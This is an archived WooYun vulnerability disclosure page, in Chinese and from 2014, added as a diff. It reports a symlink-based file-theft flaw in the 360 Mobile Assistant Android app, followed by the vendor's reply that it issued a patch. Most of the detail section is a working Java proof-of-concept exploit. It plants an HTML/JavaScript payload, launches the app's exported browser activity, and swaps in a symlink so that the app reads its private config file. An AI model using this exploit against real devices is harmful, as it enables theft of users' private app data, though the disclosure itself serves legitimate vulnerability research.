@@ -1,0 +1,357 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		360手机助手任意数据窃取漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		360手机助手任意数据窃取漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/燕子侠">燕子侠</a> 
+</li><li>提交时间：		2014-01-18 19:03</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-22：	细节向第三方安全合作伙伴开放<br/>
+									2014-01-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-08：	细节向普通白帽子公开<br/>
+									2014-02-28：	细节向实习白帽子公开<br/>
+									2014-04-18：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">据说安装量好几个亿</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">利用符号链接，可以绕过文件同源性策略的限制，调用com.qihoo.lightapp.WebAppFakeBrowserLightActivity组件解析执行特定的JavaScript脚本，可以窃取任意私有文件的内容。 <br />
+<br />
+具体利用可参考刚公布出来的firefox此类漏洞的利用，详细url参看: https://viaforensics.com/mobile-security/chained-vulnerabilities-firefox-android-pimp-browser.html <br />
+<br />
+POC如下（借鉴x3xtxt的代码):<br />
+<br />
+</p><pre><code>String sensitive_file_name = &quot;/data/data/com.qihoo.appstore/shared_prefs/common_config.xml&quot;;		<br />
+<br />
+		DP_WebViewReadAnyFilePoC(sensitive_file_name);<br />
+	}<br />
+<br />
+	@Override<br />
+	public boolean onCreateOptionsMenu(Menu menu) {<br />
+		// Inflate the menu; this adds items to the action bar if it is present.<br />
+		getMenuInflater().inflate(R.menu.main, menu);<br />
+		return true;<br />
+	}<br />
+	<br />
+<br />
+	public void DP_WebViewReadAnyFilePoC(String targetfile){<br />
+<br />
+		try{<br />
+<br />
+			<br />
+<br />
+			String shell_poc   = &quot;/data/data/&quot;+getApplicationContext().getPackageName()+&quot;/files/shellpoc.html&quot;;<br />
+<br />
+			<br />
+<br />
+			write_payload_file();<br />
+<br />
+			cmdexec(new String[] {&quot;/system/bin/chmod&quot;, &quot;-R&quot;, &quot;777&quot;, shell_poc});<br />
+<br />
+			<br />
+<br />
+			<br />
+<br />
+			String pkgName      = &quot;com.qihoo.appstore&quot;;<br />
+<br />
+			String activityName = &quot;com.qihoo.lightapp.WebAppFakeBrowserLightActivity&quot;;<br />
+<br />
+			String url          = &quot;file://&quot;+shell_poc;<br />
+<br />
+	<br />
+<br />
+			Intent intent = new Intent();<br />
+<br />
+			intent.setAction(&quot;com.qihoo.light.action.WEBAPP_LINK&quot;);<br />
+<br />
+			intent.setComponent(new ComponentName(pkgName, activityName));<br />
+<br />
+			intent.setData(Uri.parse(url));<br />
+<br />
+			startActivity(intent);<br />
+<br />
+<br />
+<br />
+			Thread.sleep(2000);<br />
+<br />
+			<br />
+<br />
+			cmdexec(new String[] {&quot;/system/bin/rm&quot;, shell_poc});<br />
+<br />
+			cmdexec(new String[] {&quot;/system/bin/ln&quot;, &quot;-s&quot;, targetfile, shell_poc});<br />
+<br />
+			cmdexec(new String[] {&quot;/system/bin/chmod&quot;, &quot;-R&quot;, &quot;777&quot;, shell_poc});<br />
+<br />
+			<br />
+<br />
+			Thread.sleep(5000);<br />
+<br />
+			<br />
+<br />
+			cmdexec(new String[] {&quot;/system/bin/rm&quot;, shell_poc});			<br />
+<br />
+		}catch(Exception e){<br />
+<br />
+			debugInfo(e.getMessage());<br />
+<br />
+		}<br />
+<br />
+	}<br />
+<br />
+<br />
+<br />
+	@SuppressWarnings(&quot;deprecation&quot;)<br />
+<br />
+	public void write_payload_file(){<br />
+<br />
+		String payloadStr = &quot;function getContent(){   \n&quot; +<br />
+<br />
+&quot;  var url = location.href;                           \n&quot; +<br />
+<br />
+&quot;  var xmlhttp;                                       \n&quot; +<br />
+<br />
+&quot;  if(window.XMLHttpRequest){                         \n&quot; +<br />
+<br />
+&quot;	xmlhttp=new XMLHttpRequest();                     \n&quot; +<br />
+<br />
+&quot;  }else{                                             \n&quot; +<br />
+<br />
+&quot;	xmlhttp=new ActiveXObject(\&quot;Microsoft.XMLHTTP\&quot;); \n&quot; +<br />
+<br />
+&quot;  }                                                  \n&quot; +<br />
+<br />
+&quot;                                                     \n&quot; + <br />
+<br />
+&quot;  xmlhttp.onreadystatechange=function()              \n&quot; +<br />
+<br />
+&quot;  {                                                  \n&quot; +<br />
+<br />
+&quot;	if (xmlhttp.readyState==4)                        \n&quot; +<br />
+<br />
+&quot;	{                                                 \n&quot; +<br />
+<br />
+<br />
+<br />
+&quot;	  alert(xmlhttp.responseText);                    \n&quot; + <br />
+<br />
+&quot;	}                                                 \n&quot; +<br />
+<br />
+&quot;  }                                                  \n&quot; +<br />
+<br />
+&quot;  xmlhttp.open(\&quot;GET\&quot;,url,true);                    \n&quot; +<br />
+<br />
+&quot;  xmlhttp.send();                                    \n&quot; +<br />
+<br />
+&quot;}                                                    \n&quot; +<br />
+<br />
+&quot;                                                     \n&quot; + <br />
+<br />
+&quot;setTimeout(getContent,4000);                         \n&quot;;<br />
+<br />
+		String htmlStr = &quot;&lt;html&gt;                                             \n&quot; + <br />
+<br />
+                &quot;&lt;head&gt;&lt;title&gt;Steal Sensitive Information PoC&lt;/title&gt;&lt;/head&gt; \n&quot; + <br />
+<br />
+	            &quot;&lt;body&gt;                                                      \n&quot; +<br />
+<br />
+                &quot;  &lt;script type=\&quot;text/javascript\&quot;&gt;                         \n&quot; + <br />
+<br />
+                      payloadStr                                                 +<br />
+<br />
+	            &quot;  &lt;/script&gt;                                                 \n&quot; +<br />
+<br />
+	            &quot;&lt;/body&gt;                                                     \n&quot; +<br />
+<br />
+	            &quot;&lt;/html&gt;&quot;;<br />
+<br />
+		try{<br />
+<br />
+			FileOutputStream fOut = openFileOutput(&quot;shellpoc.html&quot;, Context.MODE_WORLD_READABLE);<br />
+<br />
+			fOut.write(htmlStr.getBytes());<br />
+<br />
+			fOut.close();<br />
+<br />
+		}catch(Exception e){<br />
+<br />
+			debugInfo(e.getMessage());<br />
+<br />
+		}		<br />
+<br />
+	}<br />
+<br />
+	<br />
+<br />
+	public void cmdexec(String[] cmd){<br />
+<br />
+		try{<br />
+<br />
+			Runtime.getRuntime().exec(cmd);<br />
+<br />
+		}catch(Exception e){<br />
+<br />
+			debugInfo(e.getMessage());<br />
+<br />
+		}				<br />
+<br />
+	}</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/1818045646b6be239a573302f1d0fe00f7c8e917.jpg" target="_blank"><img src="../images/1818045646b6be239a573302f1d0fe00f7c8e917.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">限制符号链接 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/燕子侠" title="燕子侠">燕子侠</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-049252" title="360手机助手任意数据窃取漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：1 </p>
+													<p class="detail">确认时间：2014-01-19 20:06</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2014-01-19：感谢乌云平台和燕子侠提供的漏洞信息。
+
+这并不360手机助手的漏洞，而是Andriod原生Webview的漏洞。且只有root权限或本地存在恶意app的情况下，才可能被恶意利用。
+
+我们已经更新发布新版本进行修补，用户升级即可解决，附上新版本链接
+
+Web下载页面：
+http://www.360.cn/shoujizhushou/index.html 
+
+wap下载页面：
+http://m.360.cn/zs http://m.360.cn/nwap/baohe.html
+
+文件下载链接：
+http://down.360safe.com/360mobilemgr/360box_web.apk</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="49252";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
